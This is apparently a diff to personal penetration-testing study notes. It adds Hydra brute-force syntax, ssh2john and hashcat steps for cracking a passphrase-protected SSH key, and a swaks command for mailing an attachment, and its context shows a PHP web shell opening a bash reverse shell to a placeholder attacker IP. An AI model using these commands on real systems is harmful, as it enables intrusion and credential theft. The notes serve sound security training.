@@ -89,7 +89,7 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 ### cmd
 ### Powershell
 ### winpeas.exe
-
+## Active Directory
 
 ## Privilege Escalation
 ### Mimikatz
@@ -180,6 +180,9 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 
 # Tool Syntax
 ## Crackmapexec
+## Impacket
+## Metasploit
+
 ## Password Attacks
 ### Hydra
 - hydra -l \<user> -P /usr/share/wordlists/rockyou.txt -s \<alternate port> ssh://$IP
@@ -196,6 +199,22 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 ### john the ripper
 - ssh2john id_rsa > ssh.hash 
 - keepass2john \<database_name>.kdbx > keepass1.hash
+## ssh
+### creating ssh key
+- ssh-keygen
+- ssh -p 2222(unless 22) -i created_key(no pub) user@host.com
+- Using a -d_sa (private key) from /home/user/.ssh/id_sa
+### Finding key protected by password: if ssh key protected by a password
+1. may need to chmod 600 id_rsa (too many permissions won't work)
+2. ssh2john id_rsa > ssh.hash
+3. remove "id_rsa:" from ssh.hash
+4. hashcat -h | grep -i "ssh" (22921 for example)
+5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+
+## Swaks
+- swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server \<mail server ip> --body "message" --header "Subject: Subject" --suppress-data
+	- You will need the password of the mail server user (likely the sender)
+	- Note that the mail server may not be the same machine as the user who opens the email
 ## Wordpress Cheatsheet
 ### wpscan
 - wpscan --url http://\<url --api-token \<APItoken>
@@ -214,7 +233,6 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 	    
 	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
 	    ?>
-
 
 
 
